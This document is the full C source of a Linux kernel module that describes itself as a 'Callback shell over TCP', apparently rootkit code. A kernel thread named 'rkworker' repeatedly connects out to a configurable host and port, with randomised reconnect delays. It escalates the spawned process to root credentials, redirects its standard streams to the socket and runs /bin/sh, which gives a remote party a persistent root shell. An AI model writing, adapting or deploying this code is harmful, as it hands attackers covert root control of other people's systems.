// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/cred.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/mutex.h>
#include <linux/random.h>
#include <linux/wait.h>
#include <net/sock.h>

static char *host = "10.0.2.2";
module_param(host, charp, 0400);

static int port = 4444;
module_param(port, int, 0400);

static unsigned long reconnect_delay_ms = 5000;
module_param(reconnect_delay_ms, ulong, 0400);

static struct task_struct *rk_thread;
static DECLARE_WAIT_QUEUE_HEAD(rk_wq);
static DEFINE_MUTEX(rk_shell_lock);
static bool rk_shell_busy;
static struct file *rk_sock_file;

// Escalate to root and redirect fds to the socket
static int rk_umh_init(struct subprocess_info *info, struct cred *new)
{
	int fd;
	int i;

	commit_creds(prepare_kernel_cred(NULL));

	for (i = 0; i < 3; i++) {
		fd = get_unused_fd_flags(0);
		if (fd < 0)
			return fd;
		fd_install(fd, get_file(rk_sock_file));
	}

	return 0;
}

// One connection attempt: connect, spawn shell, wait for exit
static int rk_try_connect(void)
{
	struct socket *sock;
	struct sockaddr_in addr;
	struct subprocess_info *umh_info;
	int error;

	char *argv[] = { "/bin/sh", NULL };
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	mutex_lock(&rk_shell_lock);
	if (rk_shell_busy) {
		mutex_unlock(&rk_shell_lock);
		return -EBUSY;
	}
	rk_shell_busy = true;
	mutex_unlock(&rk_shell_lock);

	error = sock_create_kern(current->nsproxy->net_ns,
				 AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (error)
		goto out_clear;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = in_aton(host);
	addr.sin_port = htons(port);

	error = kernel_connect(sock, (struct sockaddr *)&addr,
			       sizeof(addr), 0);
	if (error)
		goto out_sock;

	rk_sock_file = sock_alloc_file(sock, 0, NULL);
	if (IS_ERR(rk_sock_file)) {
		error = PTR_ERR(rk_sock_file);
		rk_sock_file = NULL;
		goto out_sock;
	}

	umh_info = call_usermodehelper_setup(argv[0], argv, envp,
					     GFP_KERNEL,
					     rk_umh_init, NULL, NULL);
	if (!umh_info) {
		error = -ENOMEM;
		goto out_file;
	}

	// Wait for shell to finish so we know when to reconnect
	error = call_usermodehelper_exec(umh_info, UMH_WAIT_PROC);

out_file:
	fput(rk_sock_file);
	rk_sock_file = NULL;
	goto out_clear;

out_sock:
	sock_release(sock);

out_clear:
	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
	return error;
}

static int rk_agent_fn(void *data)
{
	unsigned long delay;
	unsigned long jitter_ms = 3000;

	while (!kthread_should_stop()) {
		rk_try_connect();

		if (kthread_should_stop())
			break;

		delay = msecs_to_jiffies(reconnect_delay_ms +
					 get_random_u32() % jitter_ms);
		wait_event_interruptible_timeout(rk_wq,
						 kthread_should_stop(),
						 delay);
	}

	return 0;
}

static int __init rk_init(void)
{
	rk_thread = kthread_run(rk_agent_fn, NULL, "rkworker");
	if (IS_ERR(rk_thread))
		return PTR_ERR(rk_thread);

	return 0;
}

static void __exit rk_exit(void)
{
	kthread_stop(rk_thread);

	if (rk_sock_file)
		fput(rk_sock_file);

	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Callback shell over TCP");
